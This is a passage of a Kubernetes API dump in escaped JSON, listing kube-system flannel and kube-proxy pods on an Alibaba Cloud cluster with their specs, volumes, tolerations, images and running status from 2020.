/run/flannel/subnet.env""]},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_ADMIN""]},""privileged"":false,""readOnlyRootFilesystem"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/arch"":""amd64"",""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""flannel"",""serviceAccount"":""flannel"",""nodeName"":""cn-beijing.192.168.0.152"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.152""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:41Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:51Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:51Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.152"",""podIP"":""192.168.0.152"",""podIPs"":[{""ip"":""192.168.0.152""}],""startTime"":""2020-04-08T04:12:29Z"",""initContainerStatuses"":[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:41Z"",""finishedAt"":""2020-04-08T04:12:41Z"",""containerID"":""docker://07a3b26a814dfcdf8643db99e97833487233e3f859b49cf09b80326c3e8c1d3c""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://07a3b26a814dfcdf8643db99e97833487233e3f859b49cf09b80326c3e8c1d3c""}],""containerStatuses"":[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:42Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://273680e9106de1bc3f1660839bf2f4e9322d4e0d6f7af77ad56c3f8865b36b8b"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-flannel-ds-fkbtg"",""generateName"":""kube-flannel-ds-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-fkbtg"",""uid"":""bf56a35b-0478-4684-8391-0ff7fdc9cb69"",""resourceVersion"":""1868"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""app"":""flannel"",""controller-revision-hash"":""5d9fd8ccf4"",""pod-template-generation"":""1"",""tier"":""node""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-flannel-ds"",""uid"":""70b7a644-8470-4500-9408-50e20a4a0bc5"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""run"",""hostPath"":{""path"":""/run"",""type"":""""}},{""name"":""cni"",""hostPath"":{""path"":""/etc/cni/net.d"",""type"":""""}},{""name"":""flannel-cfg"",""configMap"":{""name"":""kube-flannel-cfg"",""defaultMode"":420}},{""name"":""flannel-token-pblrl"",""secret"":{""secretName"":""flannel-token-pblrl"",""defaultMode"":420}}],""initContainers"":[{""name"":""install-cni"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/bin/sh"",""-c"",""set -e -x"
" cp -f /etc/kube-flannel/cni-conf.json /etc/cni/net.d/10-flannel.conf""],""resources"":{},""volumeMounts"":[{""name"":""cni"",""mountPath"":""/etc/cni/net.d""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""readOnlyRootFilesystem"":true}}],""containers"":[{""name"":""kube-flannel"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/opt/bin/flanneld"",""--ip-masq"",""--kube-subnet-mgr""],""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}],""resources"":{""limits"":{""cpu"":""100m"",""memory"":""256Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""run"",""mountPath"":""/run""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":30,""successThreshold"":1,""failureThreshold"":8},""readinessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_ADMIN""]},""privileged"":false,""readOnlyRootFilesystem"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/arch"":""amd64"",""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""flannel"",""serviceAccount"":""flannel"",""nodeName"":""cn-beijing.192.168.0.153"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.153""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:46Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:57Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:57Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.153"",""podIP"":""192.168.0.153"",""podIPs"":[{""ip"":""192.168.0.153""}],""startTime"":""2020-04-08T04:12:29Z"",""initContainerStatuses"":[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:45Z"",""finishedAt"":""2020-04-08T04:12:45Z"",""containerID"":""docker://3ae2d8464413d193546c31e1ee4bfe0d1f832fd52c2583b91f4e80bafc60e7fc""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://3ae2d8464413d193546c31e1ee4bfe0d1f832fd52c2583b91f4e80bafc60e7fc""}],""containerStatuses"":[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:47Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://8954f7e618772b2b2a16525fdfa7c75dee71dbdaedd0f087d477820c9db88ce7"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-flannel-ds-b6qmx"",""generateName"":""kube-flannel-ds-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-b6qmx"",""uid"":""198e43d8-dac0-4fd5-8c83-a2351cbd15f4"",""resourceVersion"":""1862"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""app"":""flannel"",""controller-revision-hash"":""5d9fd8ccf4"",""pod-template-generation"":""1"",""tier"":""node""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-flannel-ds"",""uid"":""70b7a644-8470-4500-9408-50e20a4a0bc5"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""run"",""hostPath"":{""path"":""/run"",""type"":""""}},{""name"":""cni"",""hostPath"":{""path"":""/etc/cni/net.d"",""type"":""""}},{""name"":""flannel-cfg"",""configMap"":{""name"":""kube-flannel-cfg"",""defaultMode"":420}},{""name"":""flannel-token-pblrl"",""secret"":{""secretName"":""flannel-token-pblrl"",""defaultMode"":420}}],""initContainers"":[{""name"":""install-cni"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/bin/sh"",""-c"",""set -e -x"
" cp -f /etc/kube-flannel/cni-conf.json /etc/cni/net.d/10-flannel.conf""],""resources"":{},""volumeMounts"":[{""name"":""cni"",""mountPath"":""/etc/cni/net.d""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""readOnlyRootFilesystem"":true}}],""containers"":[{""name"":""kube-flannel"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/opt/bin/flanneld"",""--ip-masq"",""--kube-subnet-mgr""],""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}],""resources"":{""limits"":{""cpu"":""100m"",""memory"":""256Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""run"",""mountPath"":""/run""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":30,""successThreshold"":1,""failureThreshold"":8},""readinessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_ADMIN""]},""privileged"":false,""readOnlyRootFilesystem"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/arch"":""amd64"",""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""flannel"",""serviceAccount"":""flannel"",""nodeName"":""cn-beijing.192.168.0.154"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.154""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:46Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:53Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:53Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.154"",""podIP"":""192.168.0.154"",""podIPs"":[{""ip"":""192.168.0.154""}],""startTime"":""2020-04-08T04:12:29Z"",""initContainerStatuses"":[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:46Z"",""finishedAt"":""2020-04-08T04:12:46Z"",""containerID"":""docker://f9a6743f6056c7c58f7cfcea0ab2ad46c9ac83f78670b0153964d4aff82b48be""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://f9a6743f6056c7c58f7cfcea0ab2ad46c9ac83f78670b0153964d4aff82b48be""}],""containerStatuses"":[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:46Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://09e161af05eb22861527b8cf4052f2f11ebaed325bb97c4b574a310721bf3ffe"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-proxy-master-bpgdm"",""generateName"":""kube-proxy-master-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-proxy-master-bpgdm"",""uid"":""764074df-9a67-44e6-a337-c245d51d785d"",""resourceVersion"":""35736400"",""creationTimestamp"":""2020-04-08T04:12:30Z"",""labels"":{""controller-revision-hash"":""7d9bdff4f"",""k8s-app"":""kube-proxy-master"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-proxy-master"",""uid"":""0966af12-5f73-4395-be07-cf31f049ab4c"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""kube-proxy-master"",""configMap"":{""name"":""kube-proxy-master"",""defaultMode"":420}},{""name"":""xtables-lock"",""hostPath"":{""path"":""/run/xtables.lock"",""type"":""FileOrCreate""}},{""name"":""lib-modules"",""hostPath"":{""path"":""/lib/modules"",""type"":""""}},{""name"":""kube-proxy-token-9ngpd"",""secret"":{""secretName"":""kube-proxy-token-9ngpd"",""defaultMode"":420}}],""containers"":[{""name"":""kube-proxy-master"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""command"":[""/usr/local/bin/kube-proxy"",""--config=/var/lib/kube-proxy/config.conf"",""--hostname-override=$(NODE_NAME)""],""env"":[{""name"":""NODE_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""spec.nodeName""}}}],""resources"":{},""volumeMounts"":[{""name"":""kube-proxy-master"",""mountPath"":""/var/lib/kube-proxy""},{""name"":""xtables-lock"",""mountPath"":""/run/xtables.lock""},{""name"":""lib-modules"",""readOnly"":true,""mountPath"":""/lib/modules""},{""name"":""kube-proxy-token-9ngpd"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""node-role.kubernetes.io/master"":""""},""serviceAccountName"":""kube-proxy"",""serviceAccount"":""kube-proxy"",""nodeName"":""cn-beijing.192.168.0.150"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.150""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:40Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:40Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:30Z""}],""hostIP"":""192.168.0.150"",""podIP"":""192.168.0.150"",""podIPs"":[{""ip"":""192.168.0.150""}],""startTime"":""2020-04-08T04:12:31Z"",""containerStatuses"":[{""name"":""kube-proxy-master"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:39Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:12:33Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://bef05721cc796bcae7edfedccabe377ab82671b678f3755dfe65587a7642c3c3""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy@sha256:7d98f65fc3518b384b0fd047a3249f6ea2546168a69a78ef750d80866d1aa0de"",""containerID"":""docker://0509f783f0726a4f924dfa73823f6134103a44de432191414db688aacad9bba7"",""started"":true}],""qosClass"":""BestEffort""}},{""metadata"":{""name"":""kube-proxy-master-rj7q5"",""generateName"":""kube-proxy-master-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-proxy-master-rj7q5"",""uid"":""64c74234-7ad3-42a7-9152-8985d3dda2f5"",""resourceVersion"":""1606"",""creationTimestamp"":""2020-04-08T04:12:30Z"",""labels"":{""controller-revision-hash"":""7d9bdff4f"",""k8s-app"":""kube-proxy-master"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-proxy-master"",""uid"":""0966af12-5f73-4395-be07-cf31f049ab4c"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""kube-proxy-master"",""configMap"":{""name"":""kube-proxy-master"",""defaultMode"":420}},{""name"":""xtables-lock"",""hostPath"":{""path"":""/run/xtables.lock"",""type"":""FileOrCreate""}},{""name"":""lib-modules"",""hostPath"":{""path"":""/lib/modules"",""type"":""""}},{""name"":""kube-proxy-token-9ngpd"",""secret"":{""secretName"":""kube-proxy-token-9ngpd"",""defaultMode"":420}}],""containers"":[{""name"":""kube-proxy-master"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""command"":[""/usr/local/bin/kube-proxy"",""--config=/var/lib/kube-proxy/config.conf"",""--hostname-override=$(NODE_NAME)""],""env"":[{""name"":""NODE_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""spec.nodeName""}}}],""resources"":{},""volumeMounts"":[{""name"":""kube-proxy-master"",""mountPath"":""/var/lib/kube-proxy""},{""name"":""xtables-lock"",""mountPath"":""/run/xtables.lock""},{""name"":""lib-modules"",""readOnly"":true,""mountPath"":""/lib/modules""},{""name"":""kube-proxy-token-9ngpd"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""node-role.kubernetes.io/master"":""""},""serviceAccountName"":""kube-proxy"",""serviceAccount"":""kube-proxy"",""nodeName"":""cn-beijing.192.168.0.152"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.152""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:33Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:33Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""}],""hostIP"":""192.168.0.152"",""podIP"":""192.168.0.152"",""podIPs"":[{""ip"":""192.168.0.152""}],""startTime"":""2020-04-08T04:12:31Z"",""containerStatuses"":[{""name"":""kube-proxy-master"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:32Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy@sha256:7d98f65fc3518b384b0fd047a3249f6ea2546168a69a78ef750d80866d1aa0de"",""containerID"":""docker://4ef30a4da0ac22571d6208489ddbf7e5a57788c2c3094e9df6d18678436b1c5f"",""started"":true}],""qosClass"":""BestEffort""}},{""metadata"":{""name"":""kube-proxy-master-xwcsf"",""generateName"":""kube-proxy-master-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-proxy-master-xwcsf"",""uid"":""6ad1ec0f-9434-44d0-8edf-db17d0e6c641"",""resourceVersion"":""1608"",""creationTimestamp"":""2020-04-08T04:12:30Z"",""labels"":{""controller-revision-hash"":""7d9bdff4f"",""k8s-app"":""kube-proxy-master"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-proxy-master"",""uid"":""0966af12-5f73-4395-be07-cf31f049ab4c"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""kube-proxy-master"",""configMap"":{""name"":""kube-proxy-master"",""defaultMode"":420}},{""name"":""xtables-lock"",""hostPath"":{""path"":""/run/xtables.lock"",""type"":""FileOrCreate""}},{""name"":""lib-modules"",""hostPath"":{""path"":""/lib/modules"",""type"":""""}},{""name"":""kube-proxy-token-9ngpd"",""secret"":{""secretName"":""kube-proxy-token-9ngpd"",""defaultMode"":420}}],""containers"":[{""name"":""kube-proxy-master"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""command"":[""/usr/local/bin/kube-proxy"",""--config=/var/lib/kube-proxy/config.conf"",""--hostname-override=$(NODE_NAME)""],""env"":[{""name"":""NODE_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""spec.nodeName""}}}],""resources"":{},""volumeMounts"":[{""name"":""kube-proxy-master"",""mountPath"":""/var/lib/kube-proxy""},{""name"":""xtables-lock"",""mountPath"":""/run/xtables.lock""},{""name"":""lib-modules"",""readOnly"":true,""mountPath"":""/lib/modules""},{""name"":""kube-proxy-token-9ngpd"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/